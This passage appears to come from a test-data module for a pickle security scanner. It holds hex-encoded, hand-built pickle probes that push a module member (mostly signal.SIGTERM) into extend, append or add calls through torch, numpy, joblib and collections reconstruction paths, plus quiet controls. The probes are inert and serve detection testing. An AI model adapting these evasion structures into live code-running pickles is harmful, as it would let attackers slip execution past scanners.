    "a09_reconstructor_obj_slots_extend": "800263636f70797265670a5f7265636f6e7374727563746f720a63636f6c6c656374696f6e730a4f726465726564446963740a636275696c74696e730a6f626a6563740a4e87524e7d8c06657874656e64637369676e616c0a5349475445524d0a7386624b01612e",
    "b01_np_reconstruct_member": "8002636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a637369676e616c0a5349475445524d0a4b008543016287522e",
    "b02_np2_reconstruct_member": "8002636e756d70792e5f636f72652e6d756c746961727261790a5f7265636f6e7374727563740a637369676e616c0a5349475445524d0a4b008543016287522e",
    "b03_np_mareconstruct_member": "8002636e756d70792e6d612e636f72650a5f6d617265636f6e7374727563740a28637369676e616c0a5349475445524d0a636e756d70790a6e6461727261790a4b008543016274522e",
    "b04_array_reconstructor_member": "80026361727261790a5f61727261795f7265636f6e7374727563746f720a28637369676e616c0a5349475445524d0a8c01624b00430074522e",
    "b05_seedsequence_member": "8002636e756d70792e72616e646f6d2e6269745f67656e657261746f720a5f5f7079785f756e7069636b6c655f5365656453657175656e63650a637369676e616c0a5349475445524d0a4b004e87522e",
    "b06_torch_wrapper_subclass_member": "800263746f7263682e5f7574696c730a5f72656275696c645f777261707065725f737562636c6173730a28637369676e616c0a5349475445524d0a63746f7263680a666c6f617433320a4b01854b01854b004e8c036370758974522e",
    "b07_np_internal_reconstruct_member": "8002636e756d70792e5f636f72652e5f696e7465726e616c0a5f7265636f6e7374727563740a637369676e616c0a5349475445524d0a4b008543016287522e",
    "k01_global_dotted_member_proto2": "80026373736c0a544c5356657273696f6e2e544c5376315f320a852e",
    "k02_global_dotted_member_noproto": "6373736c0a507572706f73652e5345525645525f415554480a2e",
    "k04_ufunc_reconstruct_dotted_member": "8002636e756d70792e636f72650a5f7566756e635f7265636f6e7374727563740a8c0373736c8c12544c5356657273696f6e2e544c5376315f3286522e",
}


# The re-check of Oct 30's probes (round 3; hand-built, never loaded): a member given as the extend, append or add
# that APPEND, APPENDS or ADDITEMS call through a slot state's __dict__ or torch's setattr-style state (g01, g01b,
# g02), a dict installed by reference and filled later (g06, g07, g18), an alias of the object (getitem, getLogger
# twice, an enum's member: g03, g03b, g04, g05) or joblib's memoised wrapper (g17). Python raises at each (no member is
# callable); each is SC-PICKLE-CODE, as on base.
RECHECK_311 = {
    "g01_slot_dunder_dict_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c085f5f646963745f5f7d8c06657874656e64637369676e616c0a5349475445524d0a737386624b01612e",
    "g01b_slot_dunder_dict_add_member": "800463636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c085f5f646963745f5f7d8c03616464637369676e616c0a5349475445524d0a73738662284b01902e",
    "g02_param_state_dunder_dict_member": "800263746f7263682e5f7574696c730a5f72656275696c645f706172616d657465725f776974685f73746174650a284e8963636f6c6c656374696f6e730a4f726465726564446963740a29527d8c085f5f646963745f5f7d8c06657874656e64637369676e616c0a5349475445524d0a737374524b01612e",
    "g03_getitem_alias_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a7362710030635f6f70657261746f720a6765746974656d0a6800854b0086524b01612e",
    "g03b_getitem_dict_alias_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29527d8c06657874656e64637369676e616c0a5349475445524d0a7362710030636f70657261746f720a6765746974656d0a7d8c016b6800738c016b86524b01612e",
    "g04_getlogger_alias_member": "8002636c6f6767696e670a6765744c6f676765720a8c017885527d8c06657874656e64637369676e616c0a5349475445524d0a736230636c6f6767696e670a6765744c6f676765720a8c017885524b01612e",
    "g05_safeuuid_alias_member": "800263757569640a53616665555549440a4b0085527d8c06657874656e64637369676e616c0a5349475445524d0a73623063757569640a53616665555549440a4b0085524b01612e",
    "g06_partial_shared_dict_late_member": "80026366756e63746f6f6c730a7061727469616c0a636275696c74696e730a696e740a855228636275696c74696e730a696e740a297d7d7101746268018c06657874656e64637369676e616c0a5349475445524d0a73304b01612e",
    "g07_slot_dict_shared_late_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c085f5f646963745f5f7d710173866268018c06657874656e64637369676e616c0a5349475445524d0a73304b01612e",
    "g17_joblib_wrapper_memo_append_member": "8002636a6f626c69622e6e756d70795f7069636b6c650a4e756d70794172726179577261707065720a298171007d288c08737562636c617373636e756d70790a6e6461727261790a8c0573686170654b01858c056f726465728c01438c056474797065636e756d70790a64747970650a8c02663889888752284b038c013c4e4e4e4affffffff4affffffff4b0074628c0a616c6c6f775f6d6d6170888c06617070656e64637369676e616c0a5349475445524d0a756241414141414141413068004b01612e",
    "g18_rebuild_from_type_dict_late_member": "800263746f7263682e5f74656e736f720a5f72656275696c645f66726f6d5f747970650a2863746f7263680a54656e736f720a63746f7263682e6e6e2e706172616d657465720a506172616d657465720a297d7101745268018c06657874656e64637369676e616c0a5349475445524d0a73304b01612e",
}


# Re-check 3's probes (round 4; hand-built, never loaded): a member given as extend through a state of pairs that
# torch.nn.Module's __dict__.update reads (e01, and e02, e03 through an alias), a dict a call fills (operator.setitem,
# dict.update and dict.setdefault through getattr: e04 to e07), a DICT state and NEWOBJ_EX's keyword arguments (e08,
# e09). Python raises at each (no member is callable); each is SC-PICKLE-CODE, as on base.
RECHECK3_311 = {
    "e01_module_listpairs_direct_member": "800263746f7263682e6e6e2e6d6f64756c65732e6d6f64756c650a4d6f64756c650a2981288c06657874656e64637369676e616c0a5349475445524d0a866c624b01612e",
    "e02_module_listpairs_alias_member": "800263746f7263682e6e6e2e6d6f64756c65732e6d6f64756c650a4d6f64756c650a2981288c06657874656e64637369676e616c0a5349475445524d0a866c62710030635f6f70657261746f720a6765746974656d0a6800854b0086524b01612e",
    "e03_module_tuplepairs_alias_member": "800263746f7263682e6e6e2e6d6f64756c65732e6d6f64756c650a4d6f64756c650a29818c06657874656e64637369676e616c0a5349475445524d0a868c08747261696e696e6789868662710030635f6f70657261746f720a6765746974656d0a6800854b0086524b01612e",
    "e04_setitem_call_slotdict_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a29524e7d8c085f5f646963745f5f7d7101738662635f6f70657261746f720a7365746974656d0a68018c06657874656e64637369676e616c0a5349475445524d0a8752304b01612e",
    "e05_setitem_call_then_build_member": "80027d710130635f6f70657261746f720a7365746974656d0a68018c06657874656e64637369676e616c0a5349475445524d0a87523063636f6c6c656374696f6e730a4f726465726564446963740a29526801624b01612e",
    "e06_dict_update_then_build_member": "80027d710130636275696c74696e730a676574617474720a636275696c74696e730a646963740a8c0675706461746586526801288c06657874656e64637369676e616c0a5349475445524d0a866c86523063636f6c6c656374696f6e730a4f726465726564446963740a29526801624b01612e",
    "e07_dict_setdefault_then_build_member": "80027d710130636275696c74696e730a676574617474720a636275696c74696e730a646963740a8c0a73657464656661756c74865268018c06657874656e64637369676e616c0a5349475445524d0a87523063636f6c6c656374696f6e730a4f726465726564446963740a29526801624b01612e",
    "e08_dict_opcode_state_member": "800263636f6c6c656374696f6e730a4f726465726564446963740a2952288c06657874656e64637369676e616c0a5349475445524d0a6462710030635f6f70657261746f720a6765746974656d0a6800854b0086524b01612e",
    "e09_newobj_ex_kwargs_member": "80046374797065730a53696d706c654e616d6573706163650a297d8c06657874656e64637369676e616c0a5349475445524d0a73923063636f6c6c656374696f6e730a4f726465726564446963740a29524b01612e",
}

# Re-check 3's precision files (round 4, M1): written by Python's own pickler with the members in 3.10's form (never
# loaded): a dict keyed by an enum's member or a class, holding a member or an object, then a deque or a list subclass
# APPENDS; and their controls. Each is quiet, as on the second amendment.
PRECISION3_311 = {
    "p01_enumkey_then_deque_p2": "80027d7100285806000000636f6e66696771017d710228635f5f6d61696e5f5f0a5472616e73706f72740a71034b0185710452710563736f636b65740a534f434b5f53545245414d0a710668034b0285710752710863736f636b65740a534f434b5f444752414d0a7109755807000000686973746f7279710a63636f6c6c656374696f6e730a64657175650a710b294b6486710c52710d28473ff000000000000047400000000000000047400800000000000065752e",
    "p01_enumkey_then_deque_p4": "800495a9000000000000007d94288c06636f6e666967947d94288c085f5f6d61696e5f5f948c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d94939468054b028594529468088c0a534f434b5f444752414d949394758c07686973746f7279948c0b636f6c6c656374696f6e73948c056465717565949394294b648694529428473ff000000000000047400000000000000047400800000000000065752e",
    "p02_enumkey_then_listsub_p2": "80027d7100285806000000636f6e66696771017d7102635f5f6d61696e5f5f0a5472616e73706f72740a71034b0185710452710563736f636b65740a534f434b5f53545245414d0a7106735804000000726f77737107635f5f6d61696e5f5f0a526f770a710829817109284b014b0265752e",
    "p02_enumkey_then_listsub_p4": "80049563000000000000007d94288c06636f6e666967947d948c085f5f6d61696e5f5f948c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d949394738c04726f77739468038c03526f77949394298194284b014b0265752e",
    "p03_typekey_then_deque_p2": "80027d710028580700000062795f7479706571017d710228635f5f6275696c74696e5f5f0a6c6f6e670a7103637369676e616c0a5349475445524d0a7104635f5f6275696c74696e5f5f0a756e69636f64650a7105637369676e616c0a534947494e540a710675580100000071710763636f6c6c656374696f6e730a64657175650a710829527109284b014b0265752e",
    "p03_typekey_then_deque_p4": "80049577000000000000007d94288c0762795f74797065947d94288c086275696c74696e73948c03696e749493948c067369676e616c948c075349475445524d94939468038c0373747294939468068c06534947494e54949394758c0171948c0b636f6c6c656374696f6e73948c056465717565949394295294284b014b0265752e",
    "p04_addkey_then_deque_p2": "80027d71002858040000006b65797371017d71022858030000006164647103637369676e616c0a534947555352310a7104580600000072656d6f76657105637369676e616c0a534947555352320a710675580100000071710763636f6c6c656374696f6e730a64657175650a710829527109580100000061710a61752e",
    "p04_addkey_then_deque_p4": "80049566000000000000007d94288c046b657973947d94288c03616464948c067369676e616c948c07534947555352319493948c0672656d6f76659468048c0753494755535232949394758c0171948c0b636f6c6c656374696f6e73948c0564657175659493942952948c01619461752e",
    "p05_dataclass_add_then_listsub_p2": "80025d710028635f5f6d61696e5f5f0a42696e64696e670a7101298171027d71032858030000006b6579710458010000006b710558030000006164647106637369676e616c0a534947555352310a7107580600000072656d6f76657108637369676e616c0a534947555352320a71097562635f5f6d61696e5f5f0a526f770a710a2981710b4b0161652e",
    "p05_dataclass_add_then_listsub_p4": "80049570000000000000005d94288c085f5f6d61696e5f5f948c0742696e64696e679493942981947d94288c036b6579948c016b948c03616464948c067369676e616c948c07534947555352319493948c0672656d6f76659468098c0753494755535232949394756268018c03526f779493942981944b0161652e",
    "p06_obj_attr_add_then_listsub_p2": "80025d710028635f5f6d61696e5f5f0a456e64706f696e740a7101298171027d7103285804000000686f7374710458090000006c6f63616c686f737471055803000000616464710663736f636b65740a41465f494e45540a71077562635f5f6d61696e5f5f0a526f770a710829817109580100000078710a61652e",
    "p06_obj_attr_add_then_listsub_p4": "80049565000000000000005d94288c085f5f6d61696e5f5f948c08456e64706f696e749493942981947d94288c04686f7374948c096c6f63616c686f7374948c03616464948c06736f636b6574948c0741465f494e4554949394756268018c03526f779493942981948c01789461652e",
    "p07_ssl_enumkey_then_deque_p2": "80027d71002858050000006d6f64657371017d7102635f5f6d61696e5f5f0a5472616e73706f72740a71034b018571045271056373736c0a434552545f52455155495245440a710673580100000071710763636f6c6c656374696f6e730a64657175650a7108295271094b0061752e",
    "p07_ssl_enumkey_then_deque_p4": "80049569000000000000007d94288c056d6f646573947d948c085f5f6d61696e5f5f948c095472616e73706f72749493944b01859452948c0373736c948c0d434552545f5245515549524544949394738c0171948c0b636f6c6c656374696f6e73948c0564657175659493942952944b0061752e",
    "p08_enumkey_objvalue_member_deque_p2": "80027d710028580800000068616e646c65727371017d7102635f5f6d61696e5f5f0a5472616e73706f72740a71034b01857104527105635f5f6d61696e5f5f0a48616e646c65720a7106298171077d71085804000000706f727471094b50736273580600000066616d696c79710a63736f636b65740a41465f494e45540a710b5807000000686973746f7279710c63636f6c6c656374696f6e730a64657175650a710d294b0a86710e52710f473ff000000000000061752e",
    "p08_enumkey_objvalue_member_deque_p4": "800495a1000000000000007d94288c0868616e646c657273947d948c085f5f6d61696e5f5f948c095472616e73706f72749493944b018594529468038c0748616e646c65729493942981947d948c04706f7274944b507362738c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c07686973746f7279948c0b636f6c6c656374696f6e73948c056465717565949394294b0a86945294473ff000000000000061752e",
    "p09_typekey_objvalue_member_deque_p2": "80027d7100285806000000636f6465637371017d7102635f5f6275696c74696e5f5f0a6c6f6e670a7103635f5f6d61696e5f5f0a496e74436f6465630a71042981710573580400000073746f707106637369676e616c0a5349475445524d0a7107580100000071710863636f6c6c656374696f6e730a64657175650a71092952710a284b014b0265752e",
    "p09_typekey_objvalue_member_deque_p4": "80049580000000000000007d94288c06636f64656373947d948c086275696c74696e73948c03696e749493948c085f5f6d61696e5f5f948c08496e74436f646563949394298194738c0473746f70948c067369676e616c948c075349475445524d9493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394295294284b014b0265752e",
    "q01_enumkey_no_object_append_p2": "80027d7100285806000000636f6e66696771017d7102635f5f6d61696e5f5f0a5472616e73706f72740a71034b0185710452710563736f636b65740a534f434b5f53545245414d0a7106735807000000686973746f727971075d710828473ff000000000000047400000000000000065752e",
    "q01_enumkey_no_object_append_p4": "80049569000000000000007d94288c06636f6e666967947d948c085f5f6d61696e5f5f948c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d949394738c07686973746f7279945d9428473ff000000000000047400000000000000065752e",
    "q02_strkey_then_deque_p2": "80027d710028580600000066616d696c79710163736f636b65740a41465f494e45540a710258040000006b696e64710363736f636b65740a534f434b5f53545245414d0a7104580100000071710563636f6c6c656374696f6e730a64657175650a7106295271074b0161752e",
    "q02_strkey_then_deque_p4": "8004955e000000000000007d94288c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c046b696e649468028c0b534f434b5f53545245414d9493948c0171948c0b636f6c6c656374696f6e73948c0564657175659493942952944b0161752e",
    "q03_deque_then_enumkey_p2": "80027d710028580100000071710163636f6c6c656374696f6e730a64657175650a7102295271034b01615806000000636f6e66696771047d7105635f5f6d61696e5f5f0a5472616e73706f72740a71064b0185710752710863736f636b65740a534f434b5f53545245414d0a710973752e",
    "q03_deque_then_enumkey_p4": "8004956b000000000000007d94288c0171948c0b636f6c6c656374696f6e73948c0564657175659493942952944b01618c06636f6e666967947d948c085f5f6d61696e5f5f948c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d94939473752e",
    "q04_strkey_objvalue_member_deque_p2": "80027d710028580800000068616e646c65727371017d710258030000007463707103635f5f6d61696e5f5f0a48616e646c65720a7104298171057d71065804000000706f727471074b50736273580600000066616d696c79710863736f636b65740a41465f494e45540a7109580100000071710a63636f6c6c656374696f6e730a64657175650a710b2952710c4b0161752e",
    "q04_strkey_objvalue_member_deque_p4": "80049580000000000000007d94288c0868616e646c657273947d948c03746370948c085f5f6d61696e5f5f948c0748616e646c65729493942981947d948c04706f7274944b507362738c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c0564657175659493942952944b0161752e",
}


# Re-check 4's precision files (round 5, A1): written by Python's own pickler (or, p23 and p24, byte for byte as
# pandas 2.x and numpy write them) with a member in 3.10's form as plain data, never loaded: a state holding a 2-item
# container that is no pair of a state of pairs (functools.partial's two arguments, a frame's BlockManager axes, a
# numpy object array of two objects, a (n, (obj, obj)) state, a list of (enum member, object) pairs), then a deque;
# and their controls. Each is quiet, as on the second and third amendments.
PRECISION4_311 = {
    "p10_dictsub_enumkey_member_deque_p2": "80027d71002858010000006d7101635f5f6d61696e5f5f0a52656769737472790a710229817103635f5f6d61696e5f5f0a5472616e73706f72740a71044b0185710552710663736f636b65740a534f434b5f53545245414d0a710773580100000071710863636f6c6c656374696f6e730a64657175650a7109294b0a86710a52710b28473ff000000000000047400000000000000065752e",
    "p10_dictsub_enumkey_member_deque_p4": "8004958b000000000000007d94288c016d948c085f5f6d61696e5f5f948c08526567697374727994939429819468028c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d949394738c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p13_partial_enum_member_deque_p2": "80027d71002858010000006671016366756e63746f6f6c730a7061727469616c0a7102635f5f6d61696e5f5f0a636f6e6e6563740a7103857104527105286803635f5f6d61696e5f5f0a5472616e73706f72740a71064b0185710752710863736f636b65740a534f434b5f53545245414d0a710986710a7d710b4e74710c62580100000071710d63636f6c6c656374696f6e730a64657175650a710e294b0a86710f52711028473ff000000000000047400000000000000065752e",
    "p13_partial_enum_member_deque_p4": "800495ad000000000000007d94288c0166948c0966756e63746f6f6c73948c077061727469616c9493948c085f5f6d61696e5f5f948c07636f6e6e6563749493948594529428680768058c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d94939486947d944e7494628c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p14_partial_class_obj_member_deque_p2": "80027d71002858010000006671016366756e63746f6f6c730a7061727469616c0a7102635f5f6d61696e5f5f0a636f6e6e6563740a7103857104527105286803635f5f6275696c74696e5f5f0a6c6f6e670a7106635f5f6d61696e5f5f0a48616e646c65720a7107298171087d71095804000000706f7274710a4b01736286710b7d710c4e74710d62580600000066616d696c79710e63736f636b65740a41465f494e45540a710f580100000071711063636f6c6c656374696f6e730a64657175650a7111294b0a86711252711328473ff000000000000047400000000000000065752e",
    "p14_partial_class_obj_member_deque_p4": "800495cd000000000000007d94288c0166948c0966756e63746f6f6c73948c077061727469616c9493948c085f5f6d61696e5f5f948c07636f6e6e656374949394859452942868078c086275696c74696e73948c03696e7494939468058c0748616e646c65729493942981947d948c04706f7274944b01736286947d944e7494628c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p15_frame_like_member_deque_p2": "80027d710028580200000064667101635f5f6d61696e5f5f0a4672616d650a7102298171037d71042858040000005f6d67727105635f5f6d61696e5f5f0a4d616e616765720a710629817107285d710828635f5f6d61696e5f5f0a5f6e65775f696e6465780a7109635f5f6d61696e5f5f0a496e6465780a710a7d710b28580400000064617461710c5d710d28580100000061710e580100000062710f6558040000006e616d6571104e758671115271126809635f5f6d61696e5f5f0a52616e6765496e6465780a71137d71142868104e5805000000737461727471154b00580400000073746f7071164b0358040000007374657071174b0175867118527119655d711a5d711b473ff000000000000061615d711c6812617d711d5806000000302e31342e31711e7d711f2858040000006178657371205d71212868126819655806000000626c6f636b7371225d712375737471246258040000005f74797071255809000000646174616672616d65712658090000005f6d6574616461746171275d71285805000000617474727371297d712a7562580600000066616d696c79712b63736f636b65740a41465f494e45540a712c580100000071712d63636f6c6c656374696f6e730a64657175650a712e294b0a86712f52713028473ff000000000000047400000000000000065752e",
    "p15_frame_like_member_deque_p4": "8004957f010000000000007d94288c026466948c085f5f6d61696e5f5f948c054672616d659493942981947d94288c045f6d67729468028c074d616e61676572949394298194285d942868028c0a5f6e65775f696e64657894939468028c05496e6465789493947d94288c0464617461945d94288c0161948c016294658c046e616d65944e7586945294680d68028c0a52616e6765496e6465789493947d942868154e8c057374617274944b008c0473746f70944b038c0473746570944b017586945294655d945d94473ff000000000000061615d946817617d948c06302e31342e31947d94288c0461786573945d94286817681f658c06626c6f636b73945d9475737494628c045f747970948c09646174616672616d65948c095f6d65746164617461945d948c056174747273947d9475628c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p16_objarray_like_member_deque_p2": "80027d7100285801000000617101635f5f6d61696e5f5f0a5f7265636f6e7374727563740a7102635f5f6d61696e5f5f0a4f626a41727261790a71034b00857104635f636f646563730a656e636f64650a7105580100000062710658060000006c6174696e31710786710852710987710a52710b284b014b0285710c58020000004f38710d895d710e28635f5f6d61696e5f5f0a48616e646c65720a710f298171107d71115804000000706f727471124b017362680f298171137d711468124b0273626574711562580600000066616d696c79711663736f636b65740a41465f494e45540a7117580100000071711863636f6c6c656374696f6e730a64657175650a7119294b0a86711a52711b28473ff000000000000047400000000000000065752e",
    "p16_objarray_like_member_deque_p4": "800495d4000000000000007d94288c0161948c085f5f6d61696e5f5f948c0c5f7265636f6e73747275637494939468028c084f626a41727261799493944b0085944301629487945294284b014b0285948c024f3894895d942868028c0748616e646c65729493942981947d948c04706f7274944b017362680f2981947d9468124b027362657494628c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p17_listpairs_state_obj_member_deque_p2": "80027d7100285801000000737101635f5f6d61696e5f5f0a506169727353746174650a7102298171035d7104635f5f6d61696e5f5f0a5472616e73706f72740a71054b01857106527107635f5f6d61696e5f5f0a48616e646c65720a7108298171097d710a5804000000706f7274710b4b01736286710c6162580600000066616d696c79710d63736f636b65740a41465f494e45540a710e580100000071710f63636f6c6c656374696f6e730a64657175650a7110294b0a86711152711228473ff000000000000047400000000000000065752e",
    "p17_listpairs_state_obj_member_deque_p4": "800495b5000000000000007d94288c0173948c085f5f6d61696e5f5f948c0a506169727353746174659493942981945d9468028c095472616e73706f72749493944b018594529468028c0748616e646c65729493942981947d948c04706f7274944b017362869461628c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p18_tuplestate_twoobjs_member_deque_p2": "80027d7100285801000000737101635f5f6d61696e5f5f0a5475706c6553746174650a7102298171034b02635f5f6d61696e5f5f0a48616e646c65720a7104298171057d71065804000000706f727471074b0173626804298171087d710968074b02736286710a86710b62580600000066616d696c79710c63736f636b65740a41465f494e45540a710d580100000071710e63636f6c6c656374696f6e730a64657175650a710f294b0a86711052711128473ff000000000000047400000000000000065752e",
    "p18_tuplestate_twoobjs_member_deque_p4": "800495ad000000000000007d94288c0173948c085f5f6d61696e5f5f948c0a5475706c6553746174659493942981944b0268028c0748616e646c65729493942981947d948c04706f7274944b01736268072981947d94680a4b02736286948694628c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "p22_namedtuple_append_member_deque_p2": "80025d710028635f5f6d61696e5f5f0a4f700a71015806000000617070656e647102637369676e616c0a5349475445524d0a710386710481710563636f6c6c656374696f6e730a64657175650a7106294b0a86710752710828473ff000000000000047400000000000000065652e",
    "p22_namedtuple_append_member_deque_p4": "8004956c000000000000005d94288c085f5f6d61696e5f5f948c024f709493948c06617070656e64948c067369676e616c948c075349475445524d949394869481948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065652e",
    "p23_pandas_frame_member_deque": "80027d28580200000064666370616e6461732e636f72652e6672616d650a446174614672616d650a29817d2858040000005f6d67726370616e6461732e636f72652e696e7465726e616c732e6d616e61676572730a426c6f636b4d616e616765720a298128286370616e6461732e636f72652e696e64657865732e626173650a5f6e65775f496e6465780a286370616e6461732e636f72652e696e64657865732e626173650a496e6465780a7d28580400000064617461636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b0174636e756d70790a64747970650a2858020000004f3889887452284b0358010000007c4e4e4e4affffffff4affffffff4b3f746289285801000000616c746258040000006e616d654e75745271106370616e6461732e636f72652e696e64657865732e626173650a5f6e65775f496e6465780a286370616e6461732e636f72652e696e64657865732e72616e67650a52616e6765496e6465780a7d2858040000006e616d654e580500000073746172744b00580400000073746f704b035804000000737465704b0175745271116c28636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b014b0374636e756d70790a64747970650a285802000000663889887452284b0358010000003c4e4e4e4affffffff4affffffff4b007462894318000000000000000000000000000000000000000000000000746271126c2868106c7d285806000000302e31342e317d2858040000006178657328681068116c5806000000626c6f636b73287d28580600000076616c756573681258080000006d67725f6c6f6373636275696c74696e730a736c6963650a284b004b014b017452756c7575746258040000005f7479705809000000646174616672616d6558090000005f6d657461646174615d580500000061747472737d58060000005f666c6167737d285817000000616c6c6f77735f6475706c69636174655f6c6162656c7388757562580600000066616d696c7963736f636b65740a41465f494e45540a58010000007163636f6c6c656374696f6e730a64657175650a285d4b0a7452284b014b0265752e",
    "p24_numpy_objarray2_member_deque": "80027d28580100000061636e756d70792e636f72652e6d756c746961727261790a5f7265636f6e7374727563740a28636e756d70790a6e6461727261790a4b00854301627452284b01284b0274636e756d70790a64747970650a2858020000004f3889887452284b0358010000007c4e4e4e4affffffff4affffffff4b3f7462892863636f70797265670a5f7265636f6e7374727563746f720a28635f5f6d61696e5f5f0a48616e646c65720a636275696c74696e730a6f626a6563740a4e74527d285804000000706f72744b01756263636f70797265670a5f7265636f6e7374727563746f720a28635f5f6d61696e5f5f0a48616e646c65720a636275696c74696e730a6f626a6563740a4e74527d285804000000706f72744b0275626c7462580600000066616d696c7963736f636b65740a41465f494e45540a58010000007163636f6c6c656374696f6e730a64657175650a285d4b0a7452284b014b0265752e",
    "q10_dictsub_enumkey_member_p2": "80027d710058010000006d7101635f5f6d61696e5f5f0a52656769737472790a710229817103635f5f6d61696e5f5f0a5472616e73706f72740a71044b0185710552710663736f636b65740a534f434b5f53545245414d0a710773732e",
    "q10_dictsub_enumkey_member_p4": "80049553000000000000007d948c016d948c085f5f6d61696e5f5f948c08526567697374727994939429819468028c095472616e73706f72749493944b01859452948c06736f636b6574948c0b534f434b5f53545245414d94939473732e",
    "q11_plaindict_enumkey_obj_member_deque_p2": "80027d71002858010000006d71017d7102635f5f6d61696e5f5f0a5472616e73706f72740a71034b01857104527105635f5f6d61696e5f5f0a48616e646c65720a7106298171077d71085804000000706f727471094b50736273580600000066616d696c79710a63736f636b65740a41465f494e45540a710b580100000071710c63636f6c6c656374696f6e730a64657175650a710d294b0a86710e52710f28473ff000000000000047400000000000000065752e",
    "q11_plaindict_enumkey_obj_member_deque_p4": "8004959e000000000000007d94288c016d947d948c085f5f6d61696e5f5f948c095472616e73706f72749493944b018594529468038c0748616e646c65729493942981947d948c04706f7274944b507362738c0666616d696c79948c06736f636b6574948c0741465f494e45549493948c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
    "q15_frame_like_member_p2": "80027d710028580200000064667101635f5f6d61696e5f5f0a4672616d650a7102298171037d71042858040000005f6d67727105635f5f6d61696e5f5f0a4d616e616765720a710629817107285d710828635f5f6d61696e5f5f0a5f6e65775f696e6465780a7109635f5f6d61696e5f5f0a496e6465780a710a7d710b28580400000064617461710c5d710d28580100000061710e580100000062710f6558040000006e616d6571104e758671115271126809635f5f6d61696e5f5f0a52616e6765496e6465780a71137d71142868104e5805000000737461727471154b00580400000073746f7071164b0358040000007374657071174b0175867118527119655d711a5d711b473ff000000000000061615d711c6812617d711d5806000000302e31342e31711e7d711f2858040000006178657371205d71212868126819655806000000626c6f636b7371225d712375737471246258040000005f74797071255809000000646174616672616d65712658090000005f6d6574616461746171275d71285805000000617474727371297d712a7562580600000066616d696c79712b63736f636b65740a41465f494e45540a712c752e",
    "q15_frame_like_member_p4": "80049548010000000000007d94288c026466948c085f5f6d61696e5f5f948c054672616d659493942981947d94288c045f6d67729468028c074d616e61676572949394298194285d942868028c0a5f6e65775f696e64657894939468028c05496e6465789493947d94288c0464617461945d94288c0161948c016294658c046e616d65944e7586945294680d68028c0a52616e6765496e6465789493947d942868154e8c057374617274944b008c0473746f70944b038c0473746570944b017586945294655d945d94473ff000000000000061615d946817617d948c06302e31342e31947d94288c0461786573945d94286817681f658c06626c6f636b73945d9475737494628c045f747970948c09646174616672616d65948c095f6d65746164617461945d948c056174747273947d9475628c0666616d696c79948c06736f636b6574948c0741465f494e4554949394752e",
    "q15b_frame_like_deque_nomember_p2": "80027d710028580200000064667101635f5f6d61696e5f5f0a4672616d650a7102298171037d71042858040000005f6d67727105635f5f6d61696e5f5f0a4d616e616765720a710629817107285d710828635f5f6d61696e5f5f0a5f6e65775f696e6465780a7109635f5f6d61696e5f5f0a496e6465780a710a7d710b28580400000064617461710c5d710d28580100000061710e580100000062710f6558040000006e616d6571104e758671115271126809635f5f6d61696e5f5f0a52616e6765496e6465780a71137d71142868104e5805000000737461727471154b00580400000073746f7071164b0358040000007374657071174b0175867118527119655d711a5d711b473ff000000000000061615d711c6812617d711d5806000000302e31342e31711e7d711f2858040000006178657371205d71212868126819655806000000626c6f636b7371225d712375737471246258040000005f74797071255809000000646174616672616d65712658090000005f6d6574616461746171275d71285805000000617474727371297d712a7562580100000071712b63636f6c6c656374696f6e730a64657175650a712c294b0a86712d52712e28473ff000000000000047400000000000000065752e",
    "q15b_frame_like_deque_nomember_p4": "80049561010000000000007d94288c026466948c085f5f6d61696e5f5f948c054672616d659493942981947d94288c045f6d67729468028c074d616e61676572949394298194285d942868028c0a5f6e65775f696e64657894939468028c05496e6465789493947d94288c0464617461945d94288c0161948c016294658c046e616d65944e7586945294680d68028c0a52616e6765496e6465789493947d942868154e8c057374617274944b008c0473746f70944b038c0473746570944b017586945294655d945d94473ff000000000000061615d946817617d948c06302e31342e31947d94288c0461786573945d94286817681f658c06626c6f636b73945d9475737494628c045f747970948c09646174616672616d65948c095f6d65746164617461945d948c056174747273947d9475628c0171948c0b636f6c6c656374696f6e73948c056465717565949394294b0a8694529428473ff000000000000047400000000000000065752e",
